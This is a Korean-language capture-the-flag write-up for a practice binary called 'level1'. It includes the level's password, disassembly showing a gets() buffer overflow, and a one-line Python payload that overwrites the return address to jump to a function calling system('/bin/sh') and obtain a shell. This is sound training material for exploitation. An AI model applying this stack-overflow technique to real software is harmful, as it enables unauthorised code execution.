> Password: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

level1 파일을 objdump를 사용해서 어셈블리 코드로 보면

```
8048486:	83 ec 50             	sub    $0x50,%esp
8048489:	8d 44 24 10          	lea    0x10(%esp),%eax
804848d:	89 04 24             	mov    %eax,(%esp)
8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
```

main 함수에서 총 읽을 byte수를 받지 않아, buffer-overflow 위험이 있는 gets를 사용하는 것을 볼 수 있다.

따라서 gets로 할당된 버퍼의 크기인 0x40보다 큰 길이의 문자열을 집어넣었을 때 잘못된 위치가 덮어씌어지는데, 이를 이용해서 ebp + 4 (main의 ret 주소)를 덮어쓰게 되면, main 함수에서 ret명령이 실행되는 순간 실행 흐름이 main의 호출자로 가는 것이 아니라, 내가 원하는 주소로 바뀌게 할 수 있다.

또한 프로그램에서 run이라는 쓰이지 않은 함수가 존재하는 것을 볼 수 있는데,

```
08048444 <run>:
8048444:	55                   	push   %ebp
8048445:	89 e5                	mov    %esp,%ebp
8048447:	83 ec 18             	sub    $0x18,%esp
804844a:	a1 c0 97 04 08       	mov    0x80497c0,%eax
804844f:	89 c2                	mov    %eax,%edx
8048451:	b8 70 85 04 08       	mov    $0x8048570,%eax
8048456:	89 54 24 0c          	mov    %edx,0xc(%esp)
804845a:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
8048461:	00 
8048462:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
8048469:	00 
804846a:	89 04 24             	mov    %eax,(%esp)
804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
804847e:	c9                   	leave  
804847f:	c3                   	ret   
```

이 함수는 단순히 system("/bin/sh")를 호출하는 함수이다.

따라서 main함수에서 0x40보다 길이가 더 긴 문자열을 입력하여 ebp + 0x4를 run 함수의 주소인 0x08048444로 덮어씌우면 다음 레벨의 쉘을 획득할 수 있다.

```bash
cat <(python -c 'print "A" * 76 + "\x44\x84\x04\x08",') - | ./level1
```

이때 주소값은 엔디안을 고려하여 넣어야 한다.